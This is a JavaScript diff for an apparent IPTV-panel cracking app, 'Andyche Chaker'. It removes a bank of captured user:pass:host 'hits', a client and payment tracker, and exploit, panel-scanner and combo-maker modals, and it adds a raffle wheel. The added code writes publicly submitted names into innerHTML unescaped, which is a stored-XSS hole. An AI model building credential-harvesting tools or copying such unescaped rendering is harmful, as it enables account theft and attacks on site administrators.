-    try {
-      const q = query(collection(db, "usuarios", currentUserEmail, "hits"), where("texto", "==", hitData.texto));
-      const querySnap = await getDocs(q);
-      
-      if (!querySnap.empty) {
-        const docRef = querySnap.docs[0].ref;
-        const data = querySnap.docs[0].data();
-        await updateDoc(docRef, {
-          usos: (data.usos || 0) + 1,
-          ultimoUso: new Date().toISOString()
-        });
-      } else {
-        await addDoc(collection(db, "usuarios", currentUserEmail, "hits"), {
-          texto: hitData.texto,
-          user: hitData.user || 'desconocido',
-          pass: hitData.pass || 'desconocido',
-          host: hitData.host || 'desconocido',
-          fecha: new Date().toISOString(),
-          usos: 1,
-          ultimoUso: new Date().toISOString()
-        });
-      }
-      await cargarHitsUsuario(currentUserEmail);
-    } catch (err) {
-      console.error('Error guardando hit:', err);
-    }
-  };
-
-  window.eliminarHitDB = async function(id) {
-    if (!currentUserEmail) return;
-    if (!confirm('¿Eliminar este hit?')) return;
-    try {
-      await deleteDoc(doc(db, "usuarios", currentUserEmail, "hits", id));
-      await cargarHitsUsuario(currentUserEmail);
-    } catch (err) {
-      console.error('Error eliminando hit:', err);
-    }
-  };
-
-  window.limpiarTodosLosHits = async function() {
-    if (!currentUserEmail) return;
-    if (!confirm('⚠️ ¿Eliminar TODOS los hits del banco?')) return;
-    try {
-      const q = query(collection(db, "usuarios", currentUserEmail, "hits"));
-      const querySnap = await getDocs(q);
-      const batch = writeBatch(db);
-      querySnap.forEach(docSnap => {
-        batch.delete(docSnap.ref);
-      });
-      await batch.commit();
-      await cargarHitsUsuario(currentUserEmail);
-    } catch (err) {
-      console.error('Error limpiando hits:', err);
-    }
-  };
-
-  window.exportarHits = function() {
-    if (!hitsUsuario.length) return alert('No hay hits para exportar.');
-    let texto = '🦁 ANDYCHE CHAKER - BANCO DE HITS 🦁\n';
-    texto += '========================================\n\n';
-    hitsUsuario.forEach((h, i) => {
-      texto += `📌 HIT #${i+1} | Usos: ${h.usos || 0}\n`;
-      texto += `${h.texto}\n\n`;
-      texto += '----------------------------------------\n\n';
-    });
-    const blob = new Blob([texto], { type: 'text/plain;charset=utf-8' });
-    const a = document.createElement('a');
-    a.href = URL.createObjectURL(blob);
-    a.download = `andyche_hits_${new Date().toISOString().slice(0,10)}.txt`;
-    a.click();
-  };
-
-  window.renderBancoHits = function() {
-    const container = document.getElementById('hitsContainer');
-    if (!hitsUsuario.length) {
-      container.innerHTML = '<p style="opacity:0.6;">No hay hits guardados.</p>';
-      return;
-    }
-    let html = '';
-    const sorted = [...hitsUsuario].sort((a, b) => new Date(b.fecha) - new Date(a.fecha));
-    sorted.forEach(h => {
-      const fecha = new Date(h.fecha).toLocaleString();
-      html += `
-        <div class="hit-block">
-          <div class="hit-header">
-            <span>👤 ${h.user || 'desconocido'}:${h.pass || 'desconocido'}</span>
-            <span class="hit-counter">📋 Usos: ${h.usos || 0} | ${fecha}</span>
-          </div>
-          <div class="hit-content">${h.texto}</div>
-          <div class="hit-actions">
-            <button class="btn-small btn-azul" onclick="copiarHit('${h.id}')">📋 Copiar</button>
-            <button class="btn-small btn-danger" onclick="eliminarHitDB('${h.id}')">🗑️</button>
-          </div>
-        </div>
-      `;
-    });
-    container.innerHTML = html;
-  };
-
-  window.copiarHit = function(id) {
-    const hit = hitsUsuario.find(h => h.id === id);
-    if (!hit) return;
-    if (currentUserEmail) {
-      updateDoc(doc(db, "usuarios", currentUserEmail, "hits", id), {
-        usos: (hit.usos || 0) + 1,
-        ultimoUso: new Date().toISOString()
-      }).then(() => {
-        cargarHitsUsuario(currentUserEmail);
-      });
-    }
-    if (navigator.clipboard?.writeText) {
-      navigator.clipboard.writeText(hit.texto).then(() => {
-        alert('✅ Hit copiado! (Usos: ' + (hit.usos + 1) + ')');
-      }).catch(() => copiarFallback(hit.texto));
-    } else {
-      copiarFallback(hit.texto);
-    }
-  };
-
-  function copiarFallback(texto) {
-    const textarea = document.createElement('textarea');
-    textarea.value = texto;
-    textarea.style.position = 'fixed';
-    textarea.style.opacity = '0';
-    document.body.appendChild(textarea);
-    textarea.select();
-    document.execCommand('copy');
-    document.body.removeChild(textarea);
-    alert('✅ Hit copiado al portapapeles!');
-  }
-
-  // ============================================================
-  // URLs POR USUARIO (FIRESTORE)
-  // ============================================================
-  let urlsUsuario = [];
-
-  async function cargarURLsUsuario(email) {
-    if (!email) return;
-    try {
-      const q = query(collection(db, "usuarios", email, "urls"));
-      const querySnap = await getDocs(q);
-      urlsUsuario = [];
-      querySnap.forEach(docSnap => {
-        urlsUsuario.push({ id: docSnap.id, ...docSnap.data() });
-      });
-      renderURLs();
-      actualizarDashboard();
-    } catch (err) {
-      console.error('Error cargando URLs:', err);
-    }
-  }
-
-  window.agregarURL = async function() {
-    const url = document.getElementById('urlInput').value.trim();
-    const nota = document.getElementById('urlNotaInput').value.trim();
-    if (!url) return alert('Ingresa una URL válida.');
-    if (!currentUserEmail) return alert('Usuario no autenticado.');
-    
-    let urlFinal = url;
-    if (!urlFinal.startsWith('http://') && !urlFinal.startsWith('https://')) {
-      urlFinal = 'http://' + urlFinal;
-    }
-    
-    try {
-      await addDoc(collection(db, "usuarios", currentUserEmail, "urls"), {
-        url: urlFinal,
-        nota: nota || '',
-        fecha: new Date().toISOString()
-      });
-      document.getElementById('urlInput').value = '';
-      document.getElementById('urlNotaInput').value = '';
-      await cargarURLsUsuario(currentUserEmail);
-    } catch (err) {
-      alert('❌ Error guardando URL: ' + err.message);
-    }
-  };
-
-  window.eliminarURL = async function(id) {
-    if (!currentUserEmail) return;
-    if (!confirm('¿Eliminar esta URL?')) return;
-    try {
-      await deleteDoc(doc(db, "usuarios", currentUserEmail, "urls", id));
-      await cargarURLsUsuario(currentUserEmail);
-    } catch (err) {
-      alert('❌ Error eliminando URL: ' + err.message);
-    }
-  };
-
-  window.usarURLEnScanner = function(url) {
-    let cleanUrl = url.replace(/^https?:\/\//, '');
-    cleanUrl = cleanUrl.replace(/\/$/, '');
-    document.getElementById('hostInput').value = cleanUrl;
-    document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
-    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-    document.getElementById('p-scanner').classList.add('active');
-    document.querySelector('[data-page="p-scanner"]').classList.add('active');
-    setTimeout(() => {
-      document.getElementById('scanner-panel').scrollIntoView({behavior: 'smooth'});
-    }, 300);
-  };
-
-  window.renderURLs = function() {
-    const container = document.getElementById('urlsContainer');
-    if (!urlsUsuario.length) {
-      container.innerHTML = '<p style="opacity:0.6;">No hay URLs guardadas.</p>';
-      return;
-    }
-    let html = '';
-    const sorted = [...urlsUsuario].sort((a, b) => new Date(b.fecha) - new Date(a.fecha));
-    sorted.forEach(u => {
-      const fecha = new Date(u.fecha).toLocaleString();
-      html += `
-        <div class="url-item">
-          <span class="url-text">
-            <a href="${u.url}" target="_blank" class="url-link"><strong>${u.url}</strong></a>
-            ${u.nota ? `<span style="opacity:0.6; font-size:11px; display:block;">📝 ${u.nota}</span>` : ''}
-            <span style="font-size:10px; opacity:0.4;">${fecha}</span>
-          </span>
-          <div class="url-actions">
-            <button class="btn-small btn-success" onclick="usarURLEnScanner('${u.url}')">📡 Scan</button>
-            <button class="btn-small btn-danger" onclick="eliminarURL('${u.id}')">🗑️</button>
-          </div>
-        </div>
-      `;
-    });
-    container.innerHTML = html;
-  };
-
-  // ============================================================
-  // CLIENTES (SOLO ADMIN - FIRESTORE GLOBAL)
-  // ============================================================
-  let clientesAdmin = [];
-
-  async function cargarClientesAdmin() {
-    if (!currentUserIsAdmin) return;
-    try {
-      const q = query(collection(db, "clientes_global"));
-      const querySnap = await getDocs(q);
-      clientesAdmin = [];
-      querySnap.forEach(docSnap => {
-        clientesAdmin.push({ id: docSnap.id, ...docSnap.data() });
-      });
-      renderClientesAdmin();
-      actualizarDashboard();
-    } catch (err) {
-      console.error('Error cargando clientes:', err);
-    }
-  }
-
-  window.agregarCliente = async function() {
-    if (!currentUserIsAdmin) return alert('Solo el admin puede gestionar clientes.');
-    
-    const nombre = document.getElementById('cli-nombre').value.trim();
-    const telefono = document.getElementById('cli-telefono').value.trim();
-    const email = document.getElementById('cli-email').value.trim();
-    const metodosPago = document.getElementById('cli-metodos-pago').value.trim();
-    const plan = document.getElementById('cli-plan').value.trim();
-    const fechaPago = document.getElementById('cli-fecha-pago').value;
-    const fechaCorte = document.getElementById('cli-fecha-corte').value;
-    const monto = document.getElementById('cli-monto').value.trim();
-    const diasPrueba = document.getElementById('cli-dias').value.trim();
-    const estado = document.getElementById('cli-estado').value.trim() || 'Activo';
-    const notas = document.getElementById('cli-notas').value.trim();
-
-    if (!nombre || !telefono) return alert('Nombre y teléfono son obligatorios.');
-    if (!fechaPago || !fechaCorte) return alert('Selecciona ambas fechas.');
-
-    try {
-      await addDoc(collection(db, "clientes_global"), {
-        nombre, telefono, email, metodosPago: metodosPago || 'No registrado',
-        plan: plan || 'Básico', fechaPago, fechaCorte,
-        monto: monto || '0', diasPrueba: diasPrueba || '0',
-        estado: estado, notas: notas || '',
-        creado: new Date().toISOString(),
-        creadoPor: currentUserEmail
-      });
-      document.getElementById('cli-nombre').value = '';
-      document.getElementById('cli-telefono').value = '';
-      document.getElementById('cli-email').value = '';
-      document.getElementById('cli-metodos-pago').value = '';
-      document.getElementById('cli-plan').value = '';
-      document.getElementById('cli-fecha-pago').value = '';
-      document.getElementById('cli-fecha-corte').value = '';
-      document.getElementById('cli-monto').value = '';
-      document.getElementById('cli-dias').value = '';
-      document.getElementById('cli-estado').value = '';
-      document.getElementById('cli-notas').value = '';
-      await cargarClientesAdmin();
-    } catch (err) {
-      alert('❌ Error guardando cliente: ' + err.message);
-    }
-  };
-
-  function renderClientesAdmin() {
-    const container = document.getElementById('lista-clientes-container');
-    if (!clientesAdmin.length) {
-      container.innerHTML = '<p style="opacity:0.6; text-align:center;">Sin clientes registrados.</p>';
-      return;
-    }
-    let html = '';
-    clientesAdmin.forEach(c => {
-      const dias = calcularDiasRestantes(c.fechaCorte);
-      let progressPercent = 0, statusText = '', statusColor = '';
-      if (dias !== null) {
-        let maxDias = 30;
-        if (dias <= 0) { progressPercent = 100; statusText = `⛔ Vencido hace ${Math.abs(dias)} días`; statusColor = 'rojo'; }
-        else if (dias <= 3) { progressPercent = 100 - (dias / maxDias * 100); statusText = `⚠️ ${dias} días`; statusColor = 'naranja'; }
-        else if (dias <= 7) { progressPercent = 100 - (dias / maxDias * 100); statusText = `📅 ${dias} días`; statusColor = 'naranja'; }
-        else { progressPercent = 100 - (dias / maxDias * 100); statusText = `✅ ${dias} días`; statusColor = 'verde'; }
-        progressPercent = Math.min(100, Math.max(0, progressPercent));
-      } else { statusText = 'Sin fecha'; statusColor = 'azul'; progressPercent = 0; }
-
-      html += `
-        <div class="cliente-card">
-          <div class="cliente-header">
-            <div><div class="cliente-nombre">${c.nombre}</div><div class="cliente-telefono">📞 ${c.telefono}</div></div>
-            <span class="badge ${c.estado === 'Activo' ? 'badge-verde' : 'badge-rojo'}">${c.estado}</span>
-          </div>
-          <div class="cliente-detalle"><span class="label">📧 Correo</span><span class="valor">${c.email || 'N/A'}</span></div>
-          <div class="cliente-detalle"><span class="label">💳 Pago</span><span class="valor azul">${c.metodosPago}</span></div>
-          <div class="cliente-detalle"><span class="label">📦 Plan</span><span class="valor rosa">${c.plan}</span></div>
-          <div class="cliente-detalle"><span class="label">💰 Monto</span><span class="valor verde">$${c.monto}</span></div>
-          <div class="cliente-detalle"><span class="label">⏰ Corte</span><span class="valor ${statusColor}">${c.fechaCorte || '—'} — ${statusText}</span></div>
-          ${c.notas ? `<div class="cliente-detalle"><span class="label">📝 Notas</span><span class="valor" style="font-size:12px; opacity:0.7;">${c.notas}</span></div>` : ''}
-          <div class="progreso-container">
-            <div class="progreso-bar"><div class="progreso-fill" style="width: ${progressPercent}%;"></div></div>
-            <div class="progreso-texto"><span>${statusText}</span><span>${Math.round(progressPercent)}%</span></div>
-          </div>
-          <div class="acciones">
-            <button class="btn-small btn-azul" onclick="abrirPanelEditar('${c.id}')">✏️ Editar</button>
-            <button class="btn-small btn-danger" onclick="eliminarCliente('${c.id}')">🗑️</button>
-          </div>
-        </div>
-      `;
-    });
-    container.innerHTML = html;
-  }
-
-  function calcularDiasRestantes(fechaCorteStr) {
-    if (!fechaCorteStr) return null;
-    const hoy = new Date(); hoy.setHours(0,0,0,0);
-    const corte = new Date(fechaCorteStr);
-    if (isNaN(corte)) return null;
-    return Math.ceil((corte - hoy) / (1000*60*60*24));
-  }
-
-  window.eliminarCliente = async function(id) {
-    if (!currentUserIsAdmin) return alert('Solo admin puede eliminar clientes.');
-    if (!confirm('¿Eliminar este cliente?')) return;
-    try {
-      await deleteDoc(doc(db, "clientes_global", id));
-      await cargarClientesAdmin();
-    } catch (err) {
-      alert('❌ Error eliminando cliente: ' + err.message);
-    }
-  };
-
-  let clienteEditando = null;
-
-  window.abrirPanelEditar = function(id) {
-    if (!currentUserIsAdmin) return alert('Solo admin puede editar clientes.');
-    const c = clientesAdmin.find(cl => cl.id === id);
-    if (!c) return;
-    clienteEditando = id;
-    document.getElementById('edit-nombre').value = c.nombre || '';
-    document.getElementById('edit-telefono').value = c.telefono || '';
-    document.getElementById('edit-email').value = c.email || '';
-    document.getElementById('edit-metodos').value = c.metodosPago || '';
-    document.getElementById('edit-plan').value = c.plan || '';
-    document.getElementById('edit-fecha-pago').value = c.fechaPago || '';
-    document.getElementById('edit-fecha-corte').value = c.fechaCorte || '';
-    document.getElementById('edit-monto').value = c.monto || '';
-    document.getElementById('edit-dias').value = c.diasPrueba || '';
-    document.getElementById('edit-estado').value = c.estado || 'Activo';
-    document.getElementById('edit-notas').value = c.notas || '';
-    document.getElementById('panel-editar-overlay').classList.add('active');
-  };
-
-  window.cerrarPanelEditar = function() {
-    document.getElementById('panel-editar-overlay').classList.remove('active');
-    clienteEditando = null;
-  };
-
-  window.guardarEdicionCliente = async function() {
-    if (!currentUserIsAdmin) return alert('Solo admin puede editar clientes.');
-    if (!clienteEditando) return alert('No hay cliente seleccionado.');
-    
-    const data = {
-      nombre: document.getElementById('edit-nombre').value.trim(),
-      telefono: document.getElementById('edit-telefono').value.trim(),
-      email: document.getElementById('edit-email').value.trim(),
-      metodosPago: document.getElementById('edit-metodos').value.trim() || 'No registrado',
-      plan: document.getElementById('edit-plan').value.trim() || 'Básico',
-      fechaPago: document.getElementById('edit-fecha-pago').value,
-      fechaCorte: document.getElementById('edit-fecha-corte').value,
-      monto: document.getElementById('edit-monto').value.trim() || '0',
-      diasPrueba: document.getElementById('edit-dias').value.trim() || '0',
-      estado: document.getElementById('edit-estado').value,
-      notas: document.getElementById('edit-notas').value.trim()
-    };
-    
-    try {
-      await updateDoc(doc(db, "clientes_global", clienteEditando), data);
-      cerrarPanelEditar();
-      await cargarClientesAdmin();
-      alert('✅ Cliente actualizado');
-    } catch (err) {
-      alert('❌ Error actualizando cliente: ' + err.message);
-    }
-  };
-
-  // ============================================================
-  // SORTEO - RULETA Y PARTICIPANTES
-  // ============================================================
-  let participantesSorteo = [];
-  let ruletaGirando = false;
-
-  // Cargar participantes del sorteo desde Firebase
   async function cargarParticipantesSorteo() {
     try {
       const q = query(collection(db, "sorteo_participantes"));
@@ -2039,86 +834,105 @@
     }
   }
 
-  // Actualizar la lista visual de participantes
+  // Escuchar cambios en tiempo real (solo para admin)
+  function escucharCambiosParticipantes() {
+    const q = query(collection(db, "sorteo_participantes"));
+    onSnapshot(q, (snap) => {
+      if (currentUserIsAdmin) {
+        participantesSorteo = [];
+        snap.forEach(docSnap => {
+          participantesSorteo.push({ id: docSnap.id, ...docSnap.data() });
+        });
+        actualizarListaParticipantes();
+        generarRuleta();
+      }
+    });
+  }
+
+  // ============================================================
+  // ACTUALIZAR LISTA DE PARTICIPANTES
+  // ============================================================
   function actualizarListaParticipantes() {
-    // Lista pública
-    const listaEl = document.getElementById('listaParticipantes');
-    const totalEl = document.getElementById('totalParticipantes');
-    totalEl.textContent = participantesSorteo.length;
+    const total = participantesSorteo.length;
     
-    if (participantesSorteo.length === 0) {
-      listaEl.innerHTML = '<p style="opacity: 0.5; font-size: 0.8rem; width: 100%; text-align: center;">No hay participantes aún. ¡Sé el primero!</p>';
+    // Dashboard
+    document.getElementById('total-participantes').textContent = total;
+    document.getElementById('totalParticipantesDash').textContent = total;
+    
+    // Lista en dashboard
+    const listaEl = document.getElementById('listaParticipantesDash');
+    if (total === 0) {
+      listaEl.innerHTML = '<p style="opacity: 0.5; font-size: 0.8rem; width: 100%; text-align: center;">No hay participantes aún.</p>';
     } else {
       listaEl.innerHTML = participantesSorteo.map(p => 
         `<span class="participante-tag">🎯 ${p.nombre}</span>`
       ).join('');
     }
     
-    // Lista de admin (solo si es admin)
-    if (currentUserIsAdmin) {
-      const adminLista = document.getElementById('listaParticipantesAdmin');
-      const totalAdmin = document.getElementById('totalParticipantesAdmin');
-      totalAdmin.textContent = participantesSorteo.length;
-      
-      if (participantesSorteo.length === 0) {
-        adminLista.innerHTML = '<p style="opacity: 0.5; font-size: 0.8rem;">No hay participantes registrados.</p>';
-      } else {
-        adminLista.innerHTML = participantesSorteo.map(p => 
-          `<div style="display: flex; justify-content: space-between; padding: 4px 8px; border-bottom: 1px solid var(--border); font-size: 0.85rem;">
-            <span>📱 ${p.nombre}</span>
-            <span style="opacity: 0.6;">${p.telefono}</span>
-          </div>`
-        ).join('');
-      }
+    // Tabla en página de participantes
+    const tabla = document.getElementById('tablaParticipantes');
+    if (total === 0) {
+      tabla.innerHTML = '<tr><td colspan="5" style="text-align: center; opacity: 0.5; padding: 20px;">No hay participantes registrados.</td></tr>';
+    } else {
+      tabla.innerHTML = participantesSorteo.map((p, i) => `
+        <tr style="border-bottom: 1px solid var(--border);">
+          <td style="padding: 10px;">${i + 1}</td>
+          <td style="padding: 10px; font-weight: 600;">${p.nombre}</td>
+          <td style="padding: 10px;">${p.telefono}</td>
+          <td style="padding: 10px; font-size: 0.8rem; opacity: 0.7;">${p.fechaRegistro ? new Date(p.fechaRegistro).toLocaleString() : '—'}</td>
+          <td style="padding: 10px;">
+            <button class="btn-small btn-danger" onclick="eliminarParticipante('${p.id}')">🗑️</button>
+          </td>
+        </tr>
+      `).join('');
     }
   }
 
-  // Generar la ruleta con los participantes
+  // ============================================================
+  // GENERAR RULETA
+  // ============================================================
   function generarRuleta() {
     const rueda = document.getElementById('ruedaSorteo');
     if (!rueda) return;
     
-    // Limpiar ruleta
     rueda.innerHTML = '';
     
     if (participantesSorteo.length === 0) {
-      // Mostrar mensaje de "Sin participantes"
       rueda.style.background = 'var(--input-bg)';
       rueda.innerHTML = `
         <div style="display: flex; align-items: center; justify-content: center; height: 100%; width: 100%; font-size: 1rem; opacity: 0.5; text-align: center; padding: 20px; border-radius: 50%;">
-          Sin participantes<br>¡Anímate!
+          Sin participantes<br>¡Espera inscripciones!
         </div>
       `;
       return;
     }
     
     rueda.style.background = 'transparent';
-    const numParticipantes = participantesSorteo.length;
+    const num = participantesSorteo.length;
     const colores = [
       '#dc2626', '#0ea5e9', '#16a34a', '#f59e0b', '#8b5cf6', 
       '#ec4899', '#14b8a6', '#f97316', '#6366f1', '#22d3ee',
       '#f43f5e', '#84cc16', '#a855f7', '#f472b6', '#06b6d4'
     ];
     
-    const angulo = 360 / numParticipantes;
+    const angulo = 360 / num;
     
     participantesSorteo.forEach((p, index) => {
       const segmento = document.createElement('div');
       segmento.className = 'segmento';
-      const color = colores[index % colores.length];
-      segmento.style.background = color;
+      segmento.style.background = colores[index % colores.length];
       segmento.style.transform = `rotate(${index * angulo}deg)`;
       segmento.style.clipPath = `polygon(0 0, 100% 0, 0 100%)`;
-      // Ajustar para que se vea bien
       segmento.innerHTML = `<span>${p.nombre}</span>`;
       rueda.appendChild(segmento);
     });
     
-    // Resetear rotación
     rueda.style.transform = 'rotate(0deg)';
   }
 
-  // Girar la ruleta
+  // ============================================================
+  // GIRAR RULETA
+  // ============================================================
   window.girarRuleta = function() {
     if (ruletaGirando) return;
     if (participantesSorteo.length < 2) {
@@ -2130,12 +944,11 @@
     document.getElementById('btnGirarRuleta').disabled = true;
     const rueda = document.getElementById('ruedaSorteo');
     
-    // Ángulo aleatorio con vueltas extra
     const vueltas = 5 + Math.floor(Math.random() * 5);
     const anguloExtra = Math.random() * 360;
     const anguloTotal = vueltas * 360 + anguloExtra;
     
-    // Sonido de inicio
+    // Sonido
     try {
       const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
       const o = audioCtx.createOscillator();
@@ -2150,30 +963,19 @@
       o.stop(audioCtx.currentTime + 0.15);
     } catch(_) {}
     
-    // Aplicar rotación
     rueda.style.transition = 'transform 4s cubic-bezier(0.17, 0.67, 0.12, 0.99)';
     rueda.style.transform = `rotate(${anguloTotal}deg)`;
     
-    // Calcular ganador después de la animación
     setTimeout(() => {
-      // Calcular en qué segmento cayó
-      const numParticipantes = participantesSorteo.length;
-      const anguloSegmento = 360 / numParticipantes;
-      
-      // Normalizar el ángulo final (0-360)
+      const num = participantesSorteo.length;
+      const anguloSegmento = 360 / num;
       const anguloFinal = anguloTotal % 360;
       
-      // El índice del ganador (invertido porque la flecha está arriba)
-      // La flecha apunta hacia arriba (270° en coordenadas estándar)
-      // El segmento que está en la parte superior es el que tiene el centro en 270°
-      let indiceGanador = Math.floor((360 - anguloFinal) / anguloSegmento) % numParticipantes;
+      // Calcular índice del ganador
+      let indice = Math.floor((360 - anguloFinal + anguloSegmento/2) / anguloSegmento) % num;
+      if (indice < 0) indice += num;
+      const ganador = participantesSorteo[indice];
       
-      // Ajuste por la posición de la flecha
-      indiceGanador = (numParticipantes - Math.floor((anguloFinal + anguloSegmento/2) / anguloSegmento)) % numParticipantes;
-      
-      const ganador = participantesSorteo[indiceGanador];
-      
-      // Mostrar modal de ganador
       mostrarGanador(ganador);
       
       ruletaGirando = false;
@@ -2200,7 +1002,9 @@
     }, 4200);
   };
 
-  // Mostrar ganador en modal
+  // ============================================================
+  // MOSTRAR GANADOR
+  // ============================================================
   function mostrarGanador(participante) {
     document.getElementById('ganadorNombre').textContent = `🎉 ${participante.nombre} 🎉`;
     document.getElementById('ganadorDetalles').textContent = `📱 ${participante.telefono}`;
@@ -2212,18 +1016,16 @@
   };
 
   // ============================================================
-  // FUNCIONES DEL SORTEO (GLOBALES)
+  // FUNCIONES PÚBLICAS
   // ============================================================
   
-  // Abrir modal de registro para el sorteo
+  // Abrir modal de registro (público)
   window.abrirModalRegistroSorteo = function() {
-    if (!currentUserEmail) {
-      alert('⚠️ Debes iniciar sesión para participar en el sorteo.');
-      return;
-    }
     document.getElementById('registroSorteoNombre').value = '';
     document.getElementById('registroSorteoTelefono').value = '';
     document.getElementById('registroSorteoMensaje').textContent = '';
+    document.getElementById('registroSorteoMensaje').style.display = 'block';
+    document.getElementById('registroExitoso').style.display = 'none';
     document.getElementById('modalRegistroSorteo').classList.add('active');
   };
 
@@ -2231,7 +1033,7 @@
     document.getElementById('modalRegistroSorteo').classList.remove('active');
   };
 
-  // Registrar participante en el sorteo
+  // Registrar participante
   window.registrarParticipanteSorteo = async function() {
     const nombre = document.getElementById('registroSorteoNombre').value.trim();
     const telefono = document.getElementById('registroSorteoTelefono').value.trim();
@@ -2255,26 +1057,29 @@
       await addDoc(collection(db, "sorteo_participantes"), {
         nombre: nombre,
         telefono: telefono,
-        fechaRegistro: new Date().toISOString(),
-        registradoPor: currentUserEmail
+        fechaRegistro: new Date().toISOString()
       });
       
-      mensaje.innerHTML = '✅ ¡Listo! Estás participando en el sorteo del loco Andy 🦁🎯';
-      mensaje.style.color = 'var(--verde-leon)';
+      // Mostrar mensaje de éxito con el aviso
+      mensaje.style.display = 'none';
+      document.getElementById('registroExitoso').style.display = 'block';
       
-      window.mostrarToast('🎯 ¡Registro exitoso!', `${nombre}, estás participando en el sorteo del loco Andy. ¡Buena suerte! 🍀`);
+      window.mostrarToast('🎯 ¡Registro exitoso!', `${nombre}, estás participando en el sorteo del Loco Andy. ¡Buena suerte! 🍀`);
       
-      // Recargar participantes
-      await cargarParticipantesSorteo();
+      // Recargar participantes (para el admin)
+      if (currentUserIsAdmin) {
+        await cargarParticipantesSorteo();
+      }
       
-      // Cerrar modal después de 2 segundos
+      // Cerrar modal después de 3 segundos
       setTimeout(() => {
         cerrarModalRegistroSorteo();
-      }, 2500);
+      }, 3000);
       
     } catch (err) {
       mensaje.innerHTML = '❌ Error al registrar: ' + err.message;
       mensaje.style.color = 'var(--rojo-leon)';
+      mensaje.style.display = 'block';
     }
   };
 
@@ -2324,30 +1129,51 @@
     }
   };
 
-  // ============================================================
-  // DASHBOARD
-  // ============================================================
-  window.actualizarDashboard = function() {
-    document.getElementById('total-hits').textContent = hitsUsuario.length;
-    document.getElementById('total-urls').textContent = urlsUsuario.length;
-    document.getElementById('total-clientes').textContent = clientesAdmin.length;
+  // Eliminar un participante específico (ADMIN)
+  window.eliminarParticipante = async function(id) {
+    if (!currentUserIsAdmin) return;
+    if (!confirm('¿Eliminar este participante?')) return;
     
-    const container = document.getElementById('ultimos-hits');
-    const sorted = [...hitsUsuario].sort((a, b) => new Date(b.fecha) - new Date(a.fecha)).slice(0, 5);
-    if (!sorted.length) {
-      container.innerHTML = '<p style="opacity:0.6;">No hay hits aún. Ejecuta un escaneo.</p>';
-    } else {
-      container.innerHTML = sorted.map(h => `
-        <div style="padding:6px 0; border-bottom:1px solid var(--border); display:flex; justify-content:space-between;">
-          <span>👤 ${h.user || 'desconocido'}:${h.pass || 'desconocido'}</span>
-          <span style="opacity:0.6;">📋 ${h.usos || 0} usos</span>
-        </div>
-      `).join('');
+    try {
+      await deleteDoc(doc(db, "sorteo_participantes", id));
+      await cargarParticipantesSorteo();
+      window.mostrarToast('🗑️ Eliminado', 'Participante eliminado del sorteo.');
+    } catch (err) {
+      alert('❌ Error eliminando participante: ' + err.message);
     }
   };
 
+  // Exportar participantes (ADMIN)
+  window.exportarParticipantes = function() {
+    if (!currentUserIsAdmin) return;
+    if (participantesSorteo.length === 0) {
+      alert('⚠️ No hay participantes para exportar.');
+      return;
+    }
+    
+    let texto = '🦁 ANDYCHE CHAKER - PARTICIPANTES DEL SORTEO 🦁\n';
+    texto += '========================================\n\n';
+    texto += `📅 Exportado: ${new Date().toLocaleString()}\n`;
+    texto += `👥 Total: ${participantesSorteo.length}\n\n`;
+    texto += '----------------------------------------\n\n';
+    
+    participantesSorteo.forEach((p, i) => {
+      texto += `📌 #${i+1}\n`;
+      texto += `   Nombre: ${p.nombre}\n`;
+      texto += `   Teléfono: ${p.telefono}\n`;
+      texto += `   Registrado: ${p.fechaRegistro ? new Date(p.fechaRegistro).toLocaleString() : '—'}\n`;
+      texto += '\n';
+    });
+    
+    const blob = new Blob([texto], { type: 'text/plain;charset=utf-8' });
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = `participantes_sorteo_${new Date().toISOString().slice(0,10)}.txt`;
+    a.click();
+  };
+
   // ============================================================
-  // NAVEGACIÓN
+  // NAVEGACIÓN (ADMIN)
   // ============================================================
   document.querySelectorAll('.nav-btn').forEach(btn => {
     const pageId = btn.getAttribute('data-page');
@@ -2357,191 +1183,9 @@
         document.getElementById(pageId).classList.add('active');
         document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
         btn.classList.add('active');
-        if (pageId === 'p-admin-users' && currentUserIsAdmin) cargarUsuariosPendientes();
-        if (pageId === 'p-urls') renderURLs();
-        if (pageId === 'p-clientes' && currentUserIsAdmin) renderClientesAdmin();
-        if (pageId === 'p-hits') renderBancoHits();
       });
     }
   });
-
-  // ============================================================
-  // MODAL - FUNCIONES DE LOS BOTONES
-  // ============================================================
-  const modalOverlay = document.getElementById('modalOverlay');
-  const modalTitle = document.getElementById('modalTitle');
-  const modalBody = document.getElementById('modalBody');
-
-  window.abrirModal = function(tipo) {
-    modalOverlay.classList.add('active');
-    let html = '';
-
-    switch(tipo) {
-      case 'exploit':
-        modalTitle.textContent = '💥 EXPLOIT - Extraer contenido Vulnerable';
-        html = `
-          <p>Busca credenciales vulnerables en paneles IPTV.</p>
-          <input id="exploitHost" placeholder="Host objetivo (ej: panel.com)">
-          <input id="exploitCombo" placeholder="Combo user:pass (opcional)">
-          <button onclick="ejecutarExploit()">🔍 Buscar Vulnerabilidades</button>
-          <div id="exploitResult" class="result-box">Esperando acción...</div>
-        `;
-        break;
-
-      case 'panel':
-        modalTitle.textContent = '🔍 PANEL SCANNER - Extracción de listas';
-        html = `
-          <p>Escanea paneles IPTV en busca de listas M3U.</p>
-          <input id="panelHost" placeholder="Dominio o IP del panel">
-          <button onclick="ejecutarPanelScanner()">🔍 Escanear Panel</button>
-          <div id="panelResult" class="result-box">Esperando acción...</div>
-        `;
-        break;
-
-      case 'buscador':
-        modalTitle.textContent = '🔎 BUSCADOR DE PANELES';
-        html = `
-          <p>Encuentra URLs de paneles IPTV mediante búsqueda avanzada.</p>
-          <input id="buscadorKeyword" placeholder="Palabra clave (ej: stalker, iptv)">
-          <button onclick="ejecutarBuscadorPaneles()">🔎 Buscar Paneles</button>
-          <div id="buscadorResult" class="result-box">Esperando acción...</div>
-        `;
-        break;
-
-      case 'combo':
-        modalTitle.textContent = '🧩 COMBO MAKER - Generador de credenciales';
-        html = `
-          <p>Genera combinaciones user:pass para pruebas.</p>
-          <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px;">
-            <input id="comboUser" placeholder="Usuario base">
-            <input id="comboPass" placeholder="Contraseña base">
-          </div>
-          <input id="comboCantidad" type="number" placeholder="Cantidad a generar" value="10">
-          <button onclick="ejecutarComboMaker()">🧩 Generar Combos</button>
-          <div id="comboResult" class="result-box">Esperando acción...</div>
-        `;
-        break;
-
